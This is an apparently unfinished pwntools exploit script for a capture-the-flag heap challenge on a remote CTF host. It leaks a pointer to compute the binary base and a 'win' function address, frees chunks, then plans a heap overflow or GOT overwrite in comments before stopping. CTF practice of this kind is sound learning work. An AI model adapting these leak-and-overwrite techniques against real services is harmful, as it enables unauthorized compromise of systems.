from pwn import *

p = remote("kubenode.mctf.io", 31098)

def recv_menu():
    return p.recvuntil(b'> ')

def register(idx, count, size, data):
    p.sendline(b'1')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Item count: ')
    p.sendline(str(count).encode())
    p.recvuntil(b'Item size (bytes): ')
    p.sendline(str(size).encode())
    p.recvuntil(b'data:\n')
    p.send(data)
    recv_menu()

def view(idx):
    p.sendline(b'2')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    res = p.recvuntil(b'\n\n===', drop=True)
    recv_menu()
    return res

def inspect(idx):
    p.sendline(b'3')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Validator    : ')
    validator = int(p.recvline().strip(), 16)
    p.recvuntil(b'Checkpoint   : ')
    checkpoint = int(p.recvline().strip(), 16)
    recv_menu()
    return validator, checkpoint

def delete(idx):
    p.sendline(b'4')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    recv_menu()

recv_menu()

register(0, 1, 16, b'A'*16)
register(1, 1, 16, b'B'*16)

val, chk0 = inspect(0)
_, chk1 = inspect(1)

base_addr = val - 0x136c
win_func = base_addr + 0x14a8
print(f"Base: {hex(base_addr)}, Win: {hex(win_func)}")

delete(1)
delete(0)

# 0 points to 1.
# What if we overwrite 0's fd?
# Wait, we have the heap overflow. We don't even need UAF.
# Allocate 2 (size 1 byte, reads 65536)
# It will be allocated at chk0.
# We can overflow into chk1.
# But wait, we can just overwrite `__free_hook` or some GOT entry?
# GOT is partial RELRO!
# Let's check checksec again.
# "RELRO:      No RELRO"
# Awesome! We can just overwrite a GOT entry.
# The array is in .bss at 3740.
# GOT is at 3608 - 3680 ? Wait, let's look at objdump -R or objdump -d for GOT.
p.close()
